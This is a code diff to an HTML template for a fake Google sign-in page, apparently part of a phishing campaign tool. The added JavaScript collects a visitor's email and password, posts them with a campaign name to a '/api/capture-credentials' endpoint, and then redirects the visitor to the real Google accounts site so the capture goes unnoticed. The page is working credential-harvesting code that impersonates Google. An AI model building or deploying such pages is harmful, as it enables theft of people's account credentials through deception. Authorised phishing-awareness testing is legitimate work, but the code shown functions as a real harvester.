@@ -8,6 +8,30 @@
     <link rel="stylesheet" href="{{ url_for('serve_phishing_static', filename='css/google.css') }}">
     <title>Google Sign in Accounts</title>
 </head>
+<script>
+    let campaignName = "Unknown Campaign";  // Default value
+
+    // Fetch the latest campaign name from the backend
+    function fetchCampaignName() {
+        fetch("/api/latest-campaign")
+            .then(response => response.json())
+            .then(data => {
+                if (data.campaign_name) {
+                    campaignName = data.campaign_name;
+                }
+            })
+            .catch(error => console.error("Error fetching campaign name:", error));
+    }
+
+    // Function to toggle the password visibility
+    function togglePassword() {
+        const passwordInput = document.getElementById("typepass");
+        passwordInput.type = passwordInput.type === "password" ? "text" : "password";
+    }
+
+    // Ensure campaign name is loaded when page is ready
+    document.addEventListener("DOMContentLoaded", fetchCampaignName);
+</script>
 
 <body>
     <div class="main_container">
@@ -86,41 +110,70 @@
     </div>
 
     <script>
-        // Function to toggle the password visibility
-        function togglePassword() {
-            const passwordInput = document.getElementById("typepass");
-            passwordInput.type = passwordInput.type === "password" ? "text" : "password";
-        }
-
-        // Handle 'Next' button click
-        document.getElementById("next").addEventListener("click", function () {
-            const email = document.getElementById("email").value;
-            if (email.trim() === "") {
-                alert("Please enter an email or phone number.");
-                return;
-            }
-
-            // Load the Password Section
-            document.getElementById("content").innerHTML = `
-                <div class="inner_container">
-                    <img src="{{ url_for('serve_phishing_static', filename='images/google2.png') }}" alt="This is an image" id="inner_logo">
-                    <div class="inner_head">
-                        <span id="Welcome">Welcome</span>
-                        <span id="here">${email}</span>
+        // Handle 'Next' button click (Show Password Input)
+        document.addEventListener("DOMContentLoaded", function () {
+            document.getElementById("next").addEventListener("click", function () {
+                const email = document.getElementById("email").value.trim();
+                if (email === "") {
+                    alert("Please enter an email or phone number.");
+                    return;
+                }
+    
+                // Load the Password Section
+                document.getElementById("content").innerHTML = `
+                    <div class="inner_container">
+                        <img src="/phish/static/images/google2.png" alt="This is an image" id="inner_logo">  <!-- Fixed URL -->
+                        <div class="inner_head">
+                            <span id="Welcome">Welcome</span>
+                            <span id="here">${email}</span>
+                        </div>
+                        <div class="email_input">
+                            <input type="password" name="password" placeholder="Enter Your password" id="typepass">
+                            <input type="checkbox" id="show-password">
+                            <label for="show-password"> Show password</label>
+                        </div>
+                        <div class="buttonS">
+                            <div><button id="Create">Forgot email?</button></div>
+                            <div><button id="submit">Next</button></div>
+                        </div>
                     </div>
-                    <div class="email_input">
-                        <input type="password" name="password" placeholder="Enter Your password" id="typepass">
-                        <input type="checkbox" onclick="togglePassword()">
-                        <label for="checkbox"> Show password</label>
-                    </div>
-                    <div class="buttonS">
-                        <div><button id="Create">Forgot email?</button></div>
-                        <div><button id="next">Next</button></div>
-                    </div>
-                </div>
-            `;
+                `;
+    
+                // Enable Show Password Toggle
+                document.getElementById("show-password").addEventListener("change", function () {
+                    document.getElementById("typepass").type = this.checked ? "text" : "password";
+                });
+    
+                // Handle Final Login Submission (Capture Credentials)
+                document.getElementById("submit").addEventListener("click", function () {
+                    const password = document.getElementById("typepass").value.trim();
+                    if (password === "") {
+                        alert("Please enter a password.");
+                        return;
+                    }
+    
+                    sendCredentials(email, password);
+                });
+            });
         });
+    
+        // Function to send captured credentials to the backend
+        function sendCredentials(email, password) {
+            fetch("/api/capture-credentials", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ campaign: campaignName, email: email, password: password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Captured:", data);
+                window.location.href = "https://accounts.google.com";  // Redirect after capture
+            })
+            .catch(error => console.error("Error capturing credentials:", error));
+        }
     </script>
+    
+    
 </body>
 
 </html>
